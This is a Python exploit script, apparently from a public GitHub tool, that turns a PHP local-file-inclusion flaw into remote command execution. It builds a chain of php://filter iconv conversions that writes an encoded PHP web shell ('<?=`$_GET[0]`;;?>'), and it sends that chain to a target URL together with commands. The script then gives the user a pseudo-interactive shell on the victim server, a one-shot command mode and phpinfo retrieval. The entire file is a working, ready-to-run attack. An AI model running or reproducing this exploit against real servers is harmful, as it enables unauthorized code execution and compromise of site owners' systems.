#!/usr/bin/python3

import sys
import requests
import argparse
from http.cookies import SimpleCookie

description = "Example : python3 %s https://example.com/vuln_page.php file" % sys.argv[0]

# Initialize parser
parser = argparse.ArgumentParser(description = description)

parser.add_argument("url", help = "full path to vulnerable page")
parser.add_argument("parameter", help = "GET parameter vulnerable to LFI")

parser.add_argument("-c", "--cookie", help = "cookie for the GET request")
parser.add_argument("--phpinfo", help = "fetch phpinfo from the server and store it in phpinfo.html", action="store_true")
parser.add_argument("-x", "--cmd", help = "execute a single command then stop program")
parser.add_argument("-f", "--file", help = "remote file to use : this should point to a valid file on the victim's server. Default : /etc/passwd")
parser.add_argument("-d", "--debug", help = "troubleshooting", action="store_true")

args = parser.parse_args()

if args.debug:
    print("""
If this script is not working as it should, it could be that :
    1. Check connection to host.
    2. The parameters given are incorrect. You must enter the complete url to the vulnerable webpage, as well as the vulnerable GET parameter. Check README.md for more info.
    3. The host is not vulnerable to LFI with filters.
    4. The file used for exploit is not accessible on the server. By default, it's /etc/passwd but this won't work on a Windows server for example. Change it to another common file (index.php for example) with -f or --file.
    5. The command prompted is incorrect. Remember : The server's OS could be Windows !
    6. PHP system function is deactivated : check phpinfo() with --phpinfo
    7. Some kind of WAF ?

    8. I don't know... In that case, feel free to leave an issue on https://github.com/Tanguy-Boisset/LFI-to-RCE-filters/issues
    """)
    exit(0)

url = args.url

if args.file:
    file_to_use = args.file
else:
    file_to_use = "/etc/passwd"

# Injected payload
if args.phpinfo:
    base64_payload = "PD9waHAgcGhwaW5mbygpOyA/Pg==" # <?php phpinfo(); ?>
else:
    base64_payload = "PD89YCRfR0VUWzBdYDs7Pz4" # <?=`$_GET[0]`;;?>

conversions = {
    '0': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2',
    '1': 'convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4',
    '2': 'convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921',
    '3': 'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE',
    '4': 'convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE',
    '5': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.8859_3.UCS2',
    '6': 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.CSIBM943.UCS4|convert.iconv.IBM866.UCS-2',
    '7': 'convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4',
    '8': 'convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2',
    '9': 'convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB',
    'A': 'convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213',
    'a': 'convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE',
    'B': 'convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000',
    'b': 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE',
    'C': 'convert.iconv.UTF8.CSISO2022KR',
    'c': 'convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2',
    'D': 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213',
    'd': 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5',
    'E': 'convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT',
    'e': 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UTF16.EUC-JP-MS|convert.iconv.ISO-8859-1.ISO_6937',
    'F': 'convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB',
    'f': 'convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213',
    'g': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8',
    'G': 'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90',
    'H': 'convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213',
    'h': 'convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE',
    'I': 'convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213',
    'i': 'convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000',
    'J': 'convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4',
    'j': 'convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16',
    'K': 'convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE',
    'k': 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2',
    'L': 'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC',
    'l': 'convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE',
    'M':'convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T',
    'm':'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949',
    'N': 'convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4',
    'n': 'convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|convert.iconv.UTF32BE.MS936|convert.iconv.OSF00010004.T.61',
    'O': 'convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775',
    'o': 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE',
    'P': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB',
    'p': 'convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4',
    'q': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.GBK.CP932|convert.iconv.BIG5.UCS2',
    'Q': 'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2',
    'R': 'convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4',
    'r': 'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.ISO-IR-99.UCS-2BE|convert.iconv.L4.OSF00010101',
    'S': 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS',
    's': 'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90',
    'T': 'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103',
    't': 'convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS',
    'U': 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943',
    'u': 'convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61',
    'V': 'convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB',
    'v': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.ISO-8859-14.UCS2',
    'W': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936',
    'w': 'convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE',
    'X': 'convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932',
    'x': 'convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS',
    'Y': 'convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361',
    'y': 'convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT',
    'Z': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16',
    'z': 'convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937',
    '/': 'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4',
    '+': 'convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157',
    '=': ''
}


# Generate some garbage base64
filters = "convert.iconv.UTF8.CSISO2022KR|"
filters += "convert.base64-encode|"
# Make sure to get rid of any equal signs in both the string we just generated and the rest of the file
filters += "convert.iconv.UTF8.UTF7|"

for c in base64_payload[::-1]:
        filters += conversions[c] + "|"
        # Decode and reencode to get rid of everything that isn't valid base64
        filters += "convert.base64-decode|"
        filters += "convert.base64-encode|"
        # Get rid of equal signs
        filters += "convert.iconv.UTF8.UTF7|"

filters += "convert.base64-decode"

final_payload = f"php://filter/{filters}/resource={file_to_use}"


if not args.cmd and not args.phpinfo:
    print("\nLaunching in pseudo-interactive mode...\nThis is NOT a shell, be careful what you execute (no cd, no interactive command...)\n")

def send_cmd(user_cmd):
    # Should work for Windows and Linux servers
    command = "echo WXCVB && %s && echo POIUY" % user_cmd

    if args.cookie:
        cookie = SimpleCookie()
        cookie.load(args.cookie)
        cookies = {k: v.value for k, v in cookie.items()}
    else:
        cookies = {}

    r = requests.get(url, params={
        "0": command,
        args.parameter: final_payload
    },cookies=cookies)

    response = r.text

    try:
        find_rslt = response[response.index('WXCVB')+len('WXCVB'):response.index('POIUY')]
        return find_rslt, 0
    except ValueError:
        print("\nThis command was NOT successful !\nIf you keep running into this message, try relaunching this script with -d or --debug.\n")
        return "", 1

def get_phpinfo():
    if args.cookie:
        cookie = SimpleCookie()
        cookie.load(args.cookie)
        cookies = {k: v.value for k, v in cookie.items()}
    else:
        cookies = {}

    r = requests.get(url, params={
        args.parameter: final_payload
    },cookies=cookies)

    response = r.text

    try:
        find_rslt = response[response.index('<title>PHP'):response.index('<h2>PHP License</h2>')]
        return find_rslt, 0
    except ValueError:
        print("\nUnable to retrieve phpinfo() data !\nIf you keep running into this message, try relaunching this script with -d or --debug.\n")
        return "", 1


if args.phpinfo:
    rslt, exit_code = get_phpinfo()
    if not exit_code:
        with open("phpinfo.html", "w") as f:
            phpinfo_css = """
                        <style type="text/css">
                            body {background-color: #fff; color: #222; font-family: sans-serif;}
                            pre {margin: 0; font-family: monospace;}
                            a:link {color: #009; text-decoration: none; background-color: #fff;}
                            a:hover {text-decoration: underline;}
                            table {border-collapse: collapse; border: 0; width: 934px; box-shadow: 1px 2px 3px #ccc;}
                            .center {text-align: center;}
                            .center table {margin: 1em auto; text-align: left;}
                            .center th {text-align: center !important;}
                            td, th {border: 1px solid #666; font-size: 75%; vertical-align: baseline; padding: 4px 5px;}
                            th {position: sticky; top: 0; background: inherit;}
                            h1 {font-size: 150%;}
                            h2 {font-size: 125%;}
                            .p {text-align: left;}
                            .e {background-color: #ccf; width: 300px; font-weight: bold;}
                            .h {background-color: #99c; font-weight: bold;}
                            .v {background-color: #ddd; max-width: 300px; overflow-x: auto; word-wrap: break-word;}
                            .v i {color: #999;}
                            img {float: right; border: 0;}
                            hr {width: 934px; background-color: #ccc; border: 0; height: 1px;}
                        </style>
            """
            f.write(phpinfo_css)
            f.write(rslt)
        print("Done : phpinfo report available in phpinfo.html !\n")
    exit(exit_code)

elif args.cmd:
    rslt, exit_code = send_cmd(args.cmd)
    print(rslt)
    exit(exit_code)

else:
    while True:
        try:
            user_cmd = input("$ ")
            rslt, exit_code = send_cmd(user_cmd)
            print(rslt)
        except KeyboardInterrupt:
            print("\nGood bye !")
            exit(0)
